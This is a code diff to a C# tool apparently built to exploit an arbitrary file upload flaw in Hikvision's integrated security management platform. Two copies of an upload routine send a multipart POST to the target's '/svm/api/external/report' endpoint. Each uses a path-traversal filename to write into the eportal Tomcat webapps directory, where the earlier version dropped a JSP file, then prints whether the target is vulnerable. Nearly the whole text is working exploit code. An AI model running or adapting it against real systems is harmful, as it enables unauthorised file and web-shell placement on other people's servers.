@@ -405,11 +405,11 @@ namespace hikvision漏洞利用工具
                 DateTime now = DateTime.Now;
                 string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                 ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
-                string filePath = "";
+                string filePath = "r1da5678b39482efb.txt";
                 string uploadUrl = textBox1.Text + "/svm/api/external/report";
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                 request.Method = "POST";
-                request.ContentType = "application/zip";
+                request.ContentType = "multipart/form-data; boundary=-----------------------------8db86cc218de63f";
                 request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                 request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
 
@@ -417,8 +417,8 @@ namespace hikvision漏洞利用工具
                 string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                 byte[] fileBytes = File.ReadAllBytes(filePath);
                 string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
-                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/ne.jsp\"\r\n" +
-                                  "Content-Type: application/octet-stream\r\n\r\n";
+                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/r1da5678b39482efb.txt\"\r\n" +
+                                  "Content-Type: application/zip\r\n\r\n";
                 long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                 request.ContentLength = formDataLength;
                 Stream requestStream = request.GetRequestStream();
@@ -433,12 +433,13 @@ namespace hikvision漏洞利用工具
                 StreamReader reader = new StreamReader(responseStream);
                 string ssss = reader.ReadToEnd();
 
-                if (response.StatusCode == HttpStatusCode.OK)
-                {
+                if (ssss.Contains("msg"))
+  {
+      richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台report任意文件上传漏洞");
 
-                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台report任意文件上传漏洞");
 
-                }
+
+  }
                 else
                 {
                     richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台report任意文件上传漏洞");
@@ -476,11 +477,11 @@ namespace hikvision漏洞利用工具
                 DateTime now = DateTime.Now;
                 string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                 ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
-                string filePath = "";
+                string filePath = "r1da5678b39482efb.txt";
                 string uploadUrl = textBox1.Text + "/svm/api/external/report";
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                 request.Method = "POST";
-                request.ContentType = "application/zip";
+                request.ContentType = "multipart/form-data; boundary=-----------------------------8db86cc218de63f";
                 request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                 request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
 
@@ -488,8 +489,8 @@ namespace hikvision漏洞利用工具
                 string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                 byte[] fileBytes = File.ReadAllBytes(filePath);
                 string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
-                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/ne.jsp\"\r\n" +
-                                  "Content-Type: application/octet-stream\r\n\r\n";
+                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/r1da5678b39482efb.txt\"\r\n" +
+                                  "Content-Type: application/zip\r\n\r\n";
                 long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                 request.ContentLength = formDataLength;
                 Stream requestStream = request.GetRequestStream();
@@ -504,12 +505,13 @@ namespace hikvision漏洞利用工具
                 StreamReader reader = new StreamReader(responseStream);
                 string ssss = reader.ReadToEnd();
 
-                if (response.StatusCode == HttpStatusCode.OK)
-                {
+                  if (ssss.Contains("msg"))
+    {
+        richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台report任意文件上传漏洞");
 
-                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台report任意文件上传漏洞");
 
-                }
+
+    }
                 else
                 {
                     richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台report任意文件上传漏洞");
